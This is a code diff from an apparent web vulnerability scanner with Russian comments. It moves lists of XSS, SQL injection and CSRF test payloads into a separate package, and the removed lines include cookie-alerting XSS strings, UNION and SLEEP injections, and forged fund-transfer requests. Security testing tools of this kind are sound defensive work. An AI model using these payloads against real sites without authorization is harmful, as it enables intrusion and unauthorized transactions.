@@ -10,6 +10,11 @@ from urllib.parse import urlparse
 
 from bs4 import BeautifulSoup
 
+# Совместимые реэкспорты: определения находятся только в payloads/.
+from payloads.csrf import SAFE_CSRF_PAYLOADS as SAFE_CSRF_PAYLOADS
+from payloads.sql import SAFE_SQL_PAYLOADS as SAFE_SQL_PAYLOADS
+from payloads.xss import SAFE_XSS_PAYLOADS as SAFE_XSS_PAYLOADS
+
 from .cache_manager import TTLCache, cache_manager
 
 # Очистка кэша при импорте модуля
@@ -56,44 +61,6 @@ SQL_ERROR_PATTERNS = [
 XSS_REFLECTED_PATTERNS = [
     re.compile(r"<script>alert\('XSS'\)</script>", re.IGNORECASE),
     re.compile(r"<svg/onload=alert\('XSS'\)>", re.IGNORECASE),
-]
-
-# Пэйлоады для тестирования
-SAFE_XSS_PAYLOADS = [
-    "<script>alert('XSS')</script>",
-    "<img src=x onerror=alert(1)>",
-    "<svg onload=alert(1)>",
-    "<img src=x onerror=alert(document.domain)>",
-    "<img src=x onerror=alert(document.cookie)>",
-    "<body onload=alert(1)>",
-    "<input onfocus=alert(1) autofocus>",
-    "<iframe src=javascript:alert(1)>",
-    "<a href=javascript:alert(1)>Click</a>",
-    '<form><button formaction="javascript:alert(1)">X</button></form>',
-]
-
-SAFE_SQL_PAYLOADS = [
-    "'",
-    '"',
-    "`",
-    "' OR '1'='1 -- ",
-    '" OR "1"="1" -- ',
-    "1' OR 1=1--",
-    "1' OR 'a'='a' -- ",
-    "admin' -- ",
-    "' OR SLEEP(5)--",
-    "' UNION SELECT NULL,NULL--",
-    "' AND 1=(SELECT COUNT(*) FROM tabname);-- ",
-    "' OR TRUE-- ",
-    "'/**/OR/**/1=1-- ",
-    "' OR 'a'='a'-- ",
-]
-
-SAFE_CSRF_PAYLOADS = [
-    '<form action="/target" method="POST"><input type="hidden" name="amount" value="1000"></form>',
-    '<img src="http://target.site/transfer?amount=1000&to=attacker">',
-    '<script>fetch("/target",{method:"POST",body:"amount=1000"})</script>',
-    '<iframe src="http://target.site/transfer?amount=1000&to=attacker"></iframe>',
 ]
 
 # Конфигурация сканирования
